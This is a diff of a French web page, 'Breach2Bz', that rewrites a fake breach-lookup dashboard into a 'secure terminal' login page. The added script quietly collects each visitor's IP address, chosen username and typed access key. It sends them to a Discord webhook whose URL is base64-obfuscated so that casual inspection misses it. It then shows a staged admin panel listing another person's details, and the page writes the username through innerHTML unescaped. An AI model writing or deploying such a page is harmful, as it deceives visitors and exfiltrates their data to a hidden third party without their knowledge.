@@ -2,216 +2,148 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Breach2Bz - Dashboard</title>
+    <title>Breach2Bz - Secure Terminal</title>
     <style>
-        :root {
-            --bg-color: #0a0a0a;
-            --card-bg: #161616;
-            --accent-blue: #1d61ff;
-            --text-main: #ffffff;
-            --text-dim: #888888;
-            --error-red: #ff3333;
-        }
-
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        /* Barre de navigation haute */
-        nav {
-            width: 100%;
-            padding: 20px 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 20px;
-            background: rgba(0,0,0,0.2);
-        }
-
-        .nav-item {
-            background: var(--card-bg);
-            padding: 8px 15px;
-            border-radius: 8px;
-            font-size: 0.9rem;
-            border: 1px solid #333;
-        }
-
-        /* Section Stats (Cartes) */
-        .stats-container {
-            display: flex;
-            gap: 15px;
-            margin-top: 40px;
-            width: 90%;
-            max-width: 1000px;
-        }
-
-        .stat-card {
-            background: var(--card-bg);
-            flex: 1;
-            padding: 20px;
-            border-radius: 12px;
-            border: 1px solid #222;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .stat-card .icon {
-            background: #222;
-            padding: 10px;
-            border-radius: 8px;
-            color: var(--text-dim);
-        }
-
-        .stat-card div span {
-            display: block;
-            font-size: 0.75rem;
-            color: var(--text-dim);
-        }
-
-        .stat-card div strong {
-            font-size: 1.1rem;
-        }
-
-        /* Section Principale */
-        .main-content {
-            margin-top: 80px;
-            text-align: center;
-            width: 100%;
-            max-width: 500px;
-        }
-
-        h1 {
-            font-size: 3rem;
-            letter-spacing: 4px;
-            margin-bottom: 30px;
-            font-weight: 800;
-        }
-
-        .subtitle {
-            color: var(--text-dim);
-            margin-bottom: 25px;
-        }
-
-        /* Formulaire */
-        .input-group {
-            position: relative;
-            margin-bottom: 20px;
-        }
-
-        input {
-            width: 100%;
-            background: #111;
-            border: 1px solid #333;
-            padding: 15px;
-            border-radius: 8px;
-            color: white;
-            box-sizing: border-box;
-            font-size: 1rem;
-            transition: border 0.3s;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: var(--accent-blue);
-        }
-
-        button {
-            width: 100%;
-            background: var(--accent-blue);
-            color: white;
-            border: none;
-            padding: 15px;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 1rem;
-            transition: opacity 0.2s;
-        }
-
-        button:hover {
-            opacity: 0.9;
-        }
-
-        /* Message d'erreur */
-        #status-message {
-            margin-top: 25px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            letter-spacing: 1px;
-            min-height: 30px;
-        }
-
-        .error-text {
-            color: var(--error-red);
-            text-transform: uppercase;
-        }
+        :root { --bg: #0a0a0a; --card: #161616; --blue: #1d61ff; --red: #ff3333; }
+        body { background-color: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { background: var(--card); padding: 30px; border-radius: 12px; border: 1px solid #333; text-align: center; width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--blue); }
+        button { width: 100%; padding: 12px; background: var(--blue); color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        button:hover { opacity: 0.8; }
+        .hidden { display: none; }
+        table { width: 100%; margin-top: 20px; border-collapse: collapse; font-size: 0.8rem; }
+        th, td { border: 1px solid #333; padding: 8px; text-align: left; }
+        th { background: #222; color: var(--blue); }
+        .error-blink { color: var(--red); font-weight: bold; margin-top: 15px; animation: blink 0.8s infinite; }
+        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.3;} 100% {opacity: 1;} }
+        
+        /* Animation de chargement */
+        .loader { width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid var(--blue); border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; margin-top: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <nav>
-        <div class="nav-item" style="color: #0f0;">● 7 en ligne</div>
-        <div class="nav-item" style="background: #00a86b;">Contact</div>
-        <div class="nav-item" style="background: #5865F2;">Discord</div>
-    </nav>
-
-    <div class="stats-container">
-        <div class="stat-card">
-            <div class="icon">🔍</div>
-            <div><span>Recherches aujourd'hui</span><strong>1</strong></div>
-        </div>
-        <div class="stat-card">
-            <div class="icon">📈</div>
-            <div><span>Recherches totales</span><strong>99437</strong></div>
-        </div>
-        <div class="stat-card">
-            <div class="icon">📁</div>
-            <div><span>Lignes totales</span><strong>1 316 467 090</strong></div>
-        </div>
+    <div id="step1" class="box">
+        <h2 style="letter-spacing: 2px;">IDENTIFICATION</h2>
+        <p style="color: #888; font-size: 0.9rem;">Entrez votre identifiant utilisateur</p>
+        <input type="text" id="username" placeholder="Pseudo...">
+        <button onclick="toStep2()">CONTINUER</button>
     </div>
 
-    <div class="main-content">
-        <h1>TU ME BREACH FR</h1>
-        <p class="subtitle">Veuillez entrer la clé d'accès :</p>
-        
-        <div class="input-group">
-            <input type="password" id="keyInput" placeholder="Clé de sécurité...">
-        </div>
-        
-        <button onclick="validate()">EXECUTER</button>
+    <div id="step2" class="box hidden">
+        <h2 id="welcomeText"></h2>
+        <input type="password" id="keyInput" placeholder="Clé d'accès...">
+        <button id="btnVerify" onclick="validateKey()">VÉRIFIER L'ACCÈS</button>
+        <div id="loaderArea" class="hidden"><div class="loader"></div><p style="font-size: 0.7rem;">Analyse des permissions...</p></div>
+        <div id="errorMsg" class="error-blink"></div>
+    </div>
 
-        <div id="status-message"></div>
+    <div id="step3" class="box hidden" style="width: 700px;">
+        <h2 style="color: #0f0; text-shadow: 0 0 10px #0f0;">ADMIN PANEL - LIVE LOGS</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Utilisateur</th>
+                    <th>Adresse IP</th>
+                    <th>Clé Tentée</th>
+                    <th>Statut</th>
+                </tr>
+            </thead>
+            <tbody id="logTable">
+                </tbody>
+        </table>
+        <p style="font-size: 0.7rem; color: #555; margin-top: 15px;">Session administrateur active via MADIOK-0005-VIEW.</p>
     </div>
 
     <script>
-        function validate() {
-            const key = document.getElementById('keyInput').value;
-            const message = document.getElementById('status-message');
+        let userPseudo = "";
+        let userIP = "";
+        
+        // Ton Webhook encodé en Base64 (masqué pour l'inspection rapide)
+        const _0x1a2b = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NzQyMTc1MDU1MDkyNTQxNi9ELTlTR1NDMUFZOUNVdzM2OVVxdTZ5aUo4d2tLSGstVHhpLTFsNWZXZ2M1V3U3RUx5RXZIT0MxdEc4YXNidlJPYURoeA==";
 
-            if (key === "liamestropmooche") {
-                // Même avec la bonne clé, on refuse
-                message.innerHTML = '<span class="error-text">CLÉ INVALIDE - ACCÈS REFUSÉ</span>';
-            } else if (key === "") {
-                message.innerHTML = '<span style="color: #888;">CHAMP VIDE</span>';
-            } else {
-                message.innerHTML = '<span class="error-text">ACCÈS REFUSÉ</span>';
-            }
+        // Récupération IP
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => userIP = data.ip)
+            .catch(() => userIP = "Inconnue");
+
+        function toStep2() {
+            userPseudo = document.getElementById('username').value;
+            if(userPseudo.length < 2) return;
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('welcomeText').innerText = "Vérification : " + userPseudo;
         }
 
-        // Support de la touche Entrée
-        document.getElementById('keyInput').addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') { validate(); }
-        });
-    </script>
+        async function sendToDiscord(pseudo, ip, key, status) {
+            const params = {
+                username: "System Log",
+                embeds: [{
+                    title: "Rapport de Connexion",
+                    color: status === "OK" ? 3066993 : 15158332,
+                    fields: [
+                        { name: "Utilisateur", value: pseudo, inline: true },
+                        { name: "IP", value: ip, inline: true },
+                        { name: "Clé", value: "`" + key + "`" },
+                        { name: "Accès", value: status }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
 
+            await fetch(atob(_0x1a2b), {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(params)
+            });
+        }
+
+        function validateKey() {
+            const key = document.getElementById('keyInput').value;
+            const error = document.getElementById('errorMsg');
+            const loader = document.getElementById('loaderArea');
+            const btn = document.getElementById('btnVerify');
+
+            error.innerText = "";
+            btn.classList.add('hidden');
+            loader.classList.remove('hidden');
+
+            // Petit délai pour faire "vrai"
+            setTimeout(() => {
+                loader.classList.add('hidden');
+                btn.classList.remove('hidden');
+
+                if (key === "MADIOK-0005-VIEW") {
+                    sendToDiscord(userPseudo, userIP, key, "ACCÈS ADMIN ACCORDÉ");
+                    showAdminPanel();
+                } else {
+                    sendToDiscord(userPseudo, userIP, key, "ACCÈS REFUSÉ");
+                    error.innerText = "ACCÈS REFUSÉ";
+                }
+            }, 2000);
+        }
+
+        function showAdminPanel() {
+            document.getElementById('step2').classList.add('hidden');
+            document.getElementById('step3').classList.remove('hidden');
+            
+            const table = document.getElementById('logTable');
+            table.innerHTML = `<tr>
+                <td>${userPseudo}</td>
+                <td>${userIP}</td>
+                <td>MADIOK-0005-VIEW</td>
+                <td style="color:#0f0">CONNECTÉ</td>
+            </tr>
+            <tr style="opacity: 0.5;">
+                <td>Mathys</td>
+                <td>92.14.xx.xx</td>
+                <td>liamestropmooche</td>
+                <td style="color:#f00">REFUSÉ</td>
+            </tr>`;
+        }
+    </script>
 </body>
 </html>
